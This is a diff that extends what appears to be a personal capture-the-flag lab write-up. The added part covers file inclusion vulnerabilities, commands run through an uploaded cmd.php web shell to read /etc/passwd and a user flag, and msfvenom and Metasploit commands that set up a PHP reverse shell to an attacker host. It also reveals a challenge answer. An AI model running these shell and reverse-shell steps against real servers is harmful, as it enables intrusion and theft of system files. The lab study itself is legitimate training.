@@ -43,6 +43,25 @@ cracking</b> attempt.</p>
 <p>Challenge 5:</p>
 <p>What is the hash value stored in the file user.txt at the target ?</p>
 <p>Answer: damn, this was hard without having any experience or clue how to do this. I found out the following:</p>
+<p>This topic is about <b>File Inclusion Vulnerabilities</b>. We have <b>Remote File Inclusion</b> and we have <b>Local File Inclusion</b>. These vulnerabilities 
+are often found in poorly-written web applications. These vulnerabilities occur when a web application allows the user to submit input into files or upload files 
+to the web server. <b>LFI</b> allows an attacker to read (and sometimes execute) files on the victim machine. This can be very dangerous because if the web 
+server is misconfigured and running with high privileges, the attacker may gain access to sensitive information. If the attacker is able to place code on the 
+web server through other means, then they may be able to execute arbitrary commands. <b>RFI</b> are easier to exploit but less common.</p>
+<h2>LFI</h2>
+<p>When looking at http://10.10.1.213/upload we can see there is a file named <b>cmd.php</b>. From now on, finding this file has to raise an alert because we can 
+do all kinds of things with this.</p>
+<p><ol>
+    <ul>http://10.10.1.213/upload/cmd.php?cmd=[Linux command(s)]</ul>
+    <ul>http://10.10.1.213/upload/cmd.php?cmd=head /etc/passwd</ul>
+    <ul>http://10.10.1.213/upload/cmd.php?cmd=ls /home</ul>
+    <ul>http://10.10.1.213/upload/cmd.php?cmd=ls /home/henry</ul>
+    <ul>http://10.10.1.213/upload/cmd.php?cmd=ls /home/henry/Desktop</ul>
+    <ul>http://10.10.1.213/upload/cmd.php?cmd=head /home/henry/Desktop/user.txt</ul>
+    <ul>Answer to challenge 5 is CrJ9</ul>
+</ol></p>
+<h2>RFI</h2>
+<p>If we want to make it a bit more difficult, we can also use RFI</p>   
 <p><ol>
 <ul>Kali has a collection of webshells at /usr/share/webshells</ul>
 <ul>In the php folder a file named php-reverse-shell.php exists</ul>
@@ -59,3 +78,20 @@ cracking</b> attempt.</p>
 <p>Challenge 6:</p>
 <p>What is the hash value stored in the file root.txt at the target ?</p>
 <p>Answer: again, this is hard without previous experience or knowledge. It has something to do with privilege escalation or adding things to the /etc/sudoers.d file. Work in progress ...</p>
+<p>The internet is littered with improperly coded web applications with multiple vulnerabilities being disclosed on a daily base. One of the more critical vulnerabilities 
+is Remote File Inclusion (RFI) that allows an attacker to force PHP code of their choosing to be executed by the remote site even though it is stored on a different 
+site</p>
+<p>We will try Metasploit to find the answer to challenge 6.</p>
+<p><ol>
+    <ul>msfvenom -p php/meterpreter/reverse_tcp LHOST=[Kali IP] LPORT=5555 -f raw -o shell.php</ul>
+    <ul>msfconsole</ul>
+    <ul>use exploit/multi/handler</ul>
+    <ul>set LHOST 10.10.1.2</ul>
+    <ul>set LPORT 5555</ul>
+    <ul>set PAYLOAD php/meterpreter/reverse_tcp</ul>
+    <ul>exploit</ul>
+</ol></p>
+<p>Upload shell.php to 10.10.1.213 and open http://10.10.1.213/upload/shell.php. This will connect back to the local Metasploit listener and open up a shell on 
+the server.</p>
+<p>Now, we can use all kinds of Linux commands such as ls, head, cat etc. For example: ls /etc/passwd; cat /etc/passwd</p>
+<p>Until now, didn't find root.txt and can't answer challenge 6 at this moment</p>
